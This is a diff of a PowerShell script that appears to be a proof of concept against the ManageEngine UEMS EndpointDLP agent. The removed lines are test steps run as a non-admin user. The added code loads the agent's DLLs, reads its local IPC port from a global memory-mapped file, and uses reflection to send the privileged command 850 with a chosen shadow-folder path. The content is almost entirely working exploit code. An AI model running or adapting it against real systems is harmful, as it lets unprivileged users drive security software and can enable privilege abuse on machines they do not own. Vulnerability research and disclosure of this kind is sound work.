@@ -1,9 +1,33 @@
-$hash | Out-File 'C:\Users\Public\uems-cmd850-before.txt'
+$bin = 'C:\Program Files (x86)\ManageEngine\UEMS_Agent\EndpointDLP\bin'
 
-Close the admin PowerShell. Then open a normal PowerShell (NOT as admin) and run:
+[void][Reflection.Assembly]::LoadFrom("$bin\AsyncIO.dll")
 
-whoami /groups | Select-String "deny|Medium"
+[void][Reflection.Assembly]::LoadFrom("$bin\NetMQ.dll")
 
-Screenshot. Then:
+$map = [IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting('Global\{37669676-A539-4FAF-BB0E-FBCE2F90B099}')
 
-"test" | Out-File "C:\Windows\Temp\UEMS-MEDLP-CMD850\test.txt"
+$view = $map.CreateViewAccessor()
+
+$port = $view.ReadInt32(0)
+
+$view.Dispose(); $map.Dispose()
+
+Write-Host "DiscoveredMEDLPPort=$port"
+
+$asm = [Reflection.Assembly]::LoadFrom("$bin\DotNetUI.dll")
+
+$type = $asm.GetType('AgentUtil.DuplexClient', $true)
+
+$client = [Activator]::CreateInstance($type)
+
+$type.GetMethod('Initialize').Invoke($client, @([int]$port))
+
+$method = $type.GetMethod('SendWithPoller', [Type[]]@([int], [string], [byte[]].MakeByRefType(), [long]))
+
+$request = '{"ShadowFolder":"C:\\Windows\\Temp\\UEMS-MEDLP-CMD850\\","TotalPages":1}'
+
+$args2 = [object[]]@(850, $request, $null, [long]10000)
+
+$ok = $method.Invoke($client, $args2)
+
+Write-Host "Command850Success=$ok"
